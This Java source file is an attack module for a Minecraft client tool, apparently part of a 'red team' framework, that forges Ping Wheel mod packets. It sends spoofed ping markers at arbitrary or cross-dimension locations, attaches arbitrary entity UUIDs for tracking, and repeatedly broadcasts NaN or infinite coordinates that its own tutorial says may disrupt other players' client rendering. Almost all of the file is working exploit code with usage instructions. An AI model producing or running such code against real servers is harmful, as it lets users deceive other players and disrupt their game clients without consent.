package com.redblue.red.modules.pingwheel;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;
import java.util.UUID;

/**
 * PW-01: Ping Location Spoof (Arbitrary Coords + Cross-Dimension + Entity Tracking)
 *
 * Verified against source:
 *   - Channel: ping-wheel-c2s:ping-location (EventNetworkChannel, NO discriminator)
 *   - ServerCore.onPingLocation(): zero validation on pos, dimension, or entity UUID
 *   - Wire: writeUtf(channel,128) + 3xwriteDouble + writeBoolean + [writeUUID] + writeInt(seq) + writeInt(dim)
 *   - Server broadcasts packet as-is to all players in same channel
 *   - playerTrackingEnabled=false only strips player UUIDs, non-player entity UUIDs pass through
 *   - dimension field is never compared to sender's actual dimension
 */
public class PW01_PingSpoof implements AttackModule {

    private static final ResourceLocation CHANNEL =
        new ResourceLocation("ping-wheel-c2s", "ping-location");

    private int sequenceCounter = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("mode", "模式", "CUSTOM_COORD",
            "CUSTOM_COORD", "NAN_CRASH", "INFINITY", "ENTITY_TRACK"),
        // coordinate params
        ConfigParam.ofFloat("x", "X坐标", 0f, -30000000f, 30000000f)
            .visibleWhen("mode", "CUSTOM_COORD"),
        ConfigParam.ofFloat("y", "Y坐标", 64f, -64f, 320f)
            .visibleWhen("mode", "CUSTOM_COORD"),
        ConfigParam.ofFloat("z", "Z坐标", 0f, -30000000f, 30000000f)
            .visibleWhen("mode", "CUSTOM_COORD"),
        // entity tracking params
        ConfigParam.ofString("entity_uuid", "实体UUID", "")
            .visibleWhen("mode", "ENTITY_TRACK"),
        // cross-dimension spoof
        ConfigParam.ofBool("spoof_dimension", "伪造维度", false),
        ConfigParam.ofInt("dimension_hash", "维度哈希值", 0, Integer.MIN_VALUE, Integer.MAX_VALUE)
            .visibleWhen("spoof_dimension", "true"),
        // channel targeting
        ConfigParam.ofString("ping_channel", "标记频道", ""),
        // auto-repeat
        ConfigParam.ofInt("interval", "自动间隔(刻)", 20, 1, 200)
    );

    @Override public String id() { return "pw01_ping_spoof"; }
    @Override public String name() { return "标记伪造"; }
    @Override public String description() { return "伪造虚假标记点欺骗其他玩家"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 选择模式：CUSTOM_COORD发送自定义坐标标记，NAN_CRASH发送NaN坐标，INFINITY发送无穷坐标，ENTITY_TRACK附加实体UUID\n"
            + "2. 根据所选模式填写对应参数\n"
            + "3. 启用后自动按间隔发送伪造标记\n\n"
            + "[参数说明]\n"
            + "模式：选择伪造标记的类型\n"
            + "X/Y/Z坐标：CUSTOM_COORD模式下的目标坐标\n"
            + "实体UUID：ENTITY_TRACK模式下要追踪的实体UUID\n"
            + "伪造维度：启用后可向其他维度发送标记\n"
            + "维度哈希值：目标维度的哈希值\n"
            + "标记频道：留空为默认频道，可指定目标频道名称\n"
            + "自动间隔：每隔N刻自动发送一次标记\n\n"
            + "[注意事项]\n"
            + "NAN_CRASH和INFINITY模式可能影响接收方客户端渲染\n"
            + "间隔设置过短可能导致自身断开连接";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("pingwheel");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        sendPing(mc);
    }

    private long lastTick = 0;

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        sendPing(mc);
    }

    private void sendPing(Minecraft mc) {
        String mode = getParam("mode").map(ConfigParam::getString).orElse("CUSTOM_COORD");
        String channel = getParam("ping_channel").map(ConfigParam::getString).orElse("");
        boolean spoofDim = getParam("spoof_dimension").map(ConfigParam::getBool).orElse(false);
        int dimHash = spoofDim
            ? getParam("dimension_hash").map(ConfigParam::getInt).orElse(0)
            : mc.level.dimension().location().hashCode();

        double px, py, pz;
        UUID entityUuid = null;

        switch (mode) {
            case "NAN_CRASH":
                px = Double.NaN;
                py = Double.NaN;
                pz = Double.NaN;
                break;
            case "INFINITY":
                px = Double.POSITIVE_INFINITY;
                py = 0;
                pz = Double.POSITIVE_INFINITY;
                break;
            case "ENTITY_TRACK":
                px = mc.player.getX();
                py = mc.player.getY();
                pz = mc.player.getZ();
                String uuidStr = getParam("entity_uuid").map(ConfigParam::getString).orElse("");
                if (!uuidStr.isEmpty()) {
                    try {
                        entityUuid = UUID.fromString(uuidStr);
                    } catch (IllegalArgumentException ignored) {}
                }
                break;
            default: // CUSTOM_COORD
                px = getParam("x").map(ConfigParam::getFloat).orElse(0f);
                py = getParam("y").map(ConfigParam::getFloat).orElse(64f);
                pz = getParam("z").map(ConfigParam::getFloat).orElse(0f);
                break;
        }

        int seq = sequenceCounter++;
        final double fx = px, fy = py, fz = pz;
        final UUID fEntity = entityUuid;
        final int fDim = dimHash;

        PacketForge.send(CHANNEL, buf -> {
            buf.writeUtf(channel, 128);
            buf.writeDouble(fx);
            buf.writeDouble(fy);
            buf.writeDouble(fz);
            buf.writeBoolean(fEntity != null);
            if (fEntity != null) {
                buf.writeUUID(fEntity);
            }
            buf.writeInt(seq);
            buf.writeInt(fDim);
        });
    }
}
